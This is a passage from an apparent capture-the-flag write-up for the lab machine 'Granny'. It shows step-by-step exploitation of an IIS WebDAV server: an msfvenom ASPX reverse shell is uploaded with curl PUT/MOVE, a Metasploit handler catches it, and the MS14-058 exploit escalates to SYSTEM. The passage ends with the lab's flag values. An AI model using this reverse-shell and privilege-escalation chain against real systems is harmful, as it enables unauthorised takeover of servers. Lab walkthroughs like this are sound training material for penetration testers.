First, create an ASPX meterpreter reverse shell.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.50 LPORT=443 -f aspx > met.aspx
```

Then upload the shell payload in the same way we did before.

```bash
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ curl -X PUT http://10.129.253.197/met.txt --data-binary @met.txt                                                                          1 ⚙
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ curl -X MOVE -H 'Destination: http://10.129.253.197/met.aspx' http://10.129.253.197/met.txt                                               1 ⚙
                                                                                                                                                  
┌──(kali㉿kali)-[~/…/Machine/Windows/Easy/Granny]
└─$ curl -s http://10.129.253.197/met.aspx
```

Configure metasploit to receive the reverse shell.

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.50:443 
[*] Sending stage (175174 bytes) to 10.129.253.197
[*] Meterpreter session 1 opened (10.10.14.50:443 -> 10.129.253.197:1031 ) at 2021-11-07 06:59:53 -0500

meterpreter >
```

![Untitled](/medias/images/granny/Untitled%208.png)

Confirm that the configuration was set properly using the “*options*” command.

Then use the “*run*” command to start the reverse tcp handler. In the browser, execute the *met-shell.aspx* payload and wait for a session to open up in Metasploit.

![Untitled](/medias/images/granny/Untitled%209.png)

```bash
msf6 exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4242             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:4242 
^C[-] Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:4242 
[*] Sending stage (175174 bytes) to 10.129.95.234
[*] Meterpreter session 1 opened (10.10.14.5:4242 -> 10.129.95.234:1034) at 2021-11-08 01:08:37 +0000

meterpreter > dir
Listing: c:\windows\system32\inetsrv
====================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100666/rw-rw-rw-  58880    fil   2017-04-12 14:16:55 +0000  ADROT.dll
40777/rwxrwxrwx   0        dir   2017-04-12 14:17:13 +0000  ASP Compiled Templates
100666/rw-rw-rw-  102400   fil   2017-04-12 14:16:55 +0000  CertMap.ocx
100666/rw-rw-rw-  297984   fil   2017-04-12 14:16:55 +0000  CertWiz.ocx
100666/rw-rw-rw-  77824    fil   2017-04-12 14:16:55 +0000  Cnfgprts.ocx
100666/rw-rw-rw-  33792    fil   2017-04-12 14:16:55 +0000  ContRot.dll
40777/rwxrwxrwx   0        dir   2017-04-12 14:17:05 +0000  History
100666/rw-rw-rw-  813332   fil   2017-04-12 14:17:03 +0000  MBSchema.bin.00000000h
100666/rw-rw-rw-  263671   fil   2017-04-12 14:17:04 +0000  MBSchema.xml
40777/rwxrwxrwx   0        dir   2017-04-12 14:17:03 +0000  MetaBack
100666/rw-rw-rw-  43604    fil   2017-04-12 14:17:03 +0000  MetaBase.xml
100666/rw-rw-rw-  61440    fil   2017-04-12 14:16:55 +0000  NEXTLINK.dll
100666/rw-rw-rw-  291328   fil   2017-04-12 14:16:54 +0000  adsiis.dll
100666/rw-rw-rw-  388096   fil   2017-04-12 14:16:55 +0000  asp.dll
100666/rw-rw-rw-  27478    fil   2017-04-12 14:16:55 +0000  asp.mfl
100666/rw-rw-rw-  21302    fil   2017-04-12 14:16:55 +0000  asp.mof
100666/rw-rw-rw-  47104    fil   2017-04-12 14:16:55 +0000  browscap.dll
100666/rw-rw-rw-  32423    fil   2017-04-12 14:16:55 +0000  browscap.ini
100666/rw-rw-rw-  82432    fil   2017-04-12 14:16:54 +0000  certobj.dll
100666/rw-rw-rw-  1844     fil   2017-04-12 14:16:56 +0000  clusweb.vbs
100666/rw-rw-rw-  64000    fil   2017-04-12 14:16:54 +0000  coadmin.dll
100777/rwxrwxrwx  27136    fil   2017-04-12 14:16:55 +0000  davcdata.exe
100666/rw-rw-rw-  6656     fil   2017-04-12 14:16:55 +0000  davcprox.dll
100666/rw-rw-rw-  25600    fil   2017-04-12 14:16:55 +0000  gzip.dll
100666/rw-rw-rw-  241664   fil   2017-04-12 14:16:55 +0000  httpext.dll
100666/rw-rw-rw-  18944    fil   2017-04-12 14:16:55 +0000  httpmib.dll
100666/rw-rw-rw-  48640    fil   2017-04-12 14:16:55 +0000  httpodbc.dll
100666/rw-rw-rw-  48993    fil   2017-04-12 14:16:55 +0000  iis.msc
100777/rwxrwxrwx  48       fil   2017-04-12 14:16:56 +0000  iis_switch.bat
100666/rw-rw-rw-  9709     fil   2017-04-12 14:16:56 +0000  iis_switch.vbs
100666/rw-rw-rw-  21504    fil   2017-04-12 14:16:54 +0000  iisadmin.dll
100666/rw-rw-rw-  21582    fil   2017-04-12 14:16:54 +0000  iisadmin.mfl
100666/rw-rw-rw-  12934    fil   2017-04-12 14:16:54 +0000  iisadmin.mof
40777/rwxrwxrwx   0        dir   2017-04-12 14:05:06 +0000  iisadmpwd
100666/rw-rw-rw-  1133056  fil   2017-04-12 14:16:54 +0000  iiscfg.dll
100666/rw-rw-rw-  62976    fil   2017-04-12 14:16:56 +0000  iisclex4.dll
100666/rw-rw-rw-  82944    fil   2017-04-12 14:16:54 +0000  iisext.dll
100666/rw-rw-rw-  76288    fil   2017-04-12 14:16:54 +0000  iislog.dll
100666/rw-rw-rw-  122880   fil   2017-04-12 14:16:54 +0000  iisres.dll
100777/rwxrwxrwx  28160    fil   2017-04-12 14:16:55 +0000  iisrstas.exe
100666/rw-rw-rw-  217088   fil   2017-04-12 14:16:54 +0000  iisui.dll
100666/rw-rw-rw-  68608    fil   2017-04-12 14:16:55 +0000  iisuiobj.dll
100666/rw-rw-rw-  167936   fil   2017-04-12 14:16:54 +0000  iisutil.dll
100666/rw-rw-rw-  216576   fil   2017-04-12 14:16:55 +0000  iisw3adm.dll
100666/rw-rw-rw-  194560   fil   2017-04-12 14:16:54 +0000  iiswmi.dll
100777/rwxrwxrwx  14336    fil   2017-04-12 14:16:54 +0000  inetinfo.exe
100666/rw-rw-rw-  1058304  fil   2017-04-12 14:16:55 +0000  inetmgr.dll
100777/rwxrwxrwx  19456    fil   2017-04-12 14:16:55 +0000  inetmgr.exe
100666/rw-rw-rw-  235520   fil   2017-04-12 14:16:54 +0000  infocomm.dll
100666/rw-rw-rw-  8192     fil   2017-04-12 14:16:55 +0000  isapips.dll
100666/rw-rw-rw-  52736    fil   2017-04-12 14:16:54 +0000  isatq.dll
100666/rw-rw-rw-  19456    fil   2017-04-12 14:16:54 +0000  iscomlog.dll
100666/rw-rw-rw-  25600    fil   2017-04-12 14:16:54 +0000  logscrpt.dll
100666/rw-rw-rw-  326      fil   2017-04-12 14:16:56 +0000  logtemp.sql
100666/rw-rw-rw-  67584    fil   2017-04-12 14:16:54 +0000  logui.ocx
100666/rw-rw-rw-  13312    fil   2017-04-12 14:16:54 +0000  lonsint.dll
100666/rw-rw-rw-  234496   fil   2017-04-12 14:16:54 +0000  metadata.dll
100666/rw-rw-rw-  187392   fil   2017-04-12 14:16:55 +0000  nntpadm.dll
100666/rw-rw-rw-  2663424  fil   2017-04-12 14:16:55 +0000  nntpsnap.dll
100666/rw-rw-rw-  4096     fil   2017-04-12 14:16:54 +0000  rpcref.dll
100666/rw-rw-rw-  219136   fil   2017-04-12 14:16:54 +0000  seo.dll
100666/rw-rw-rw-  179200   fil   2017-04-12 14:16:54 +0000  smtpadm.dll
100666/rw-rw-rw-  2086400  fil   2017-04-12 14:16:55 +0000  smtpsnap.dll
100666/rw-rw-rw-  24064    fil   2017-04-12 14:16:55 +0000  ssinc.dll
100666/rw-rw-rw-  44544    fil   2017-04-12 14:16:54 +0000  svcext.dll
100666/rw-rw-rw-  114176   fil   2017-04-12 14:16:54 +0000  uihelper.dll
100666/rw-rw-rw-  15360    fil   2017-04-12 14:16:55 +0000  urlauth.dll
100666/rw-rw-rw-  19456    fil   2017-04-12 14:16:55 +0000  w3cache.dll
100666/rw-rw-rw-  10752    fil   2017-04-12 14:16:55 +0000  w3comlog.dll
100666/rw-rw-rw-  349696   fil   2017-04-12 14:16:55 +0000  w3core.dll
100666/rw-rw-rw-  96808    fil   2017-04-12 14:16:55 +0000  w3core.mfl
100666/rw-rw-rw-  74002    fil   2017-04-12 14:16:55 +0000  w3core.mof
100666/rw-rw-rw-  6144     fil   2017-04-12 14:16:55 +0000  w3ctrlps.dll
100666/rw-rw-rw-  24064    fil   2017-04-12 14:16:55 +0000  w3ctrs.dll
100666/rw-rw-rw-  39424    fil   2017-04-12 14:16:55 +0000  w3dt.dll
100666/rw-rw-rw-  5706     fil   2017-04-12 14:16:55 +0000  w3dt.mfl
100666/rw-rw-rw-  6238     fil   2017-04-12 14:16:55 +0000  w3dt.mof
100666/rw-rw-rw-  92672    fil   2017-04-12 14:16:55 +0000  w3ext.dll
100666/rw-rw-rw-  62464    fil   2017-04-12 14:16:55 +0000  w3isapi.dll
100666/rw-rw-rw-  2738     fil   2017-04-12 14:16:55 +0000  w3isapi.mfl
100666/rw-rw-rw-  2446     fil   2017-04-12 14:16:55 +0000  w3isapi.mof
100666/rw-rw-rw-  13312    fil   2017-04-12 14:16:55 +0000  w3tp.dll
100777/rwxrwxrwx  7168     fil   2017-04-12 14:16:55 +0000  w3wp.exe
100666/rw-rw-rw-  23040    fil   2017-04-12 14:16:55 +0000  wam.dll
100666/rw-rw-rw-  6656     fil   2017-04-12 14:16:55 +0000  wamps.dll
100666/rw-rw-rw-  55808    fil   2017-04-12 14:16:55 +0000  wamreg.dll

meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > search local_exploit

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester

Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use 0
msf6 post(multi/recon/local_exploit_suggester) > set session 1 
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.95.234 - Collecting local exploits for x86/windows...
[*] 10.129.95.234 - 37 exploit checks are being tried...
[+] 10.129.95.234 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.95.234 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.95.234 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.129.95.234 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.95.234 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.95.234 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.95.234 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_058_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms14_058_track_popup_menu) > show options 

Module options (exploit/windows/local/ms14_058_track_popup_menu):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.183.172   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows x86

msf6 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4242
lport => 4242
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4444
lport => 4444
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set lhost tun0 
lhost => tun0
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms14_058_track_popup_menu) > show options 

Module options (exploit/windows/local/ms14_058_track_popup_menu):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows x86

msf6 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
session => 1
msf6 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Launching notepad to host the exploit...
[+] Process 484 launched.
[*] Reflectively injecting the exploit DLL into 484...
[*] Injecting exploit into 484...
[*] Exploit injected. Injecting payload into 484...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.129.95.234
[*] Meterpreter session 2 opened (10.10.14.5:4444 -> 10.129.95.234:1035) at 2021-11-08 01:11:28 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2108 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>cd c:\
cd c:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\

04/12/2017  04:27 PM    <DIR>          ADFS
04/12/2017  04:04 PM                 0 AUTOEXEC.BAT
04/12/2017  04:04 PM                 0 CONFIG.SYS
04/12/2017  09:19 PM    <DIR>          Documents and Settings
04/12/2017  04:17 PM    <DIR>          FPSE_search
04/12/2017  04:17 PM    <DIR>          Inetpub
12/24/2017  07:21 PM    <DIR>          Program Files
09/16/2021  01:49 PM    <DIR>          WINDOWS
04/12/2017  04:05 PM    <DIR>          wmpub
               2 File(s)              0 bytes
               7 Dir(s)   1,334,607,872 bytes free

C:\>cd Documents and Settings
cd Documents and Settings

C:\Documents and Settings>cd Administrator\Desktop
dir
cd Administrator\Desktop

C:\Documents and Settings\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\Documents and Settings\Administrator\Desktop

04/12/2017  04:28 PM    <DIR>          .
04/12/2017  04:28 PM    <DIR>          ..
04/12/2017  09:17 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   1,333,252,096 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
aa4beed1c0584445ab463a6747bd06e9
C:\Documents and Settings\Administrator\Desktop>dir ../../    
dir ../../
Invalid switch - "..".

C:\Documents and Settings\Administrator\Desktop>cd ..
cd ..

C:\Documents and Settings\Administrator>cd ..
cd ..

C:\Documents and Settings>type Lakis\Desktop\user.txt
type Lakis\Desktop\user.txt
700c5dc163014e22b3e408f8703f67d1
C:\Documents and Settings>
```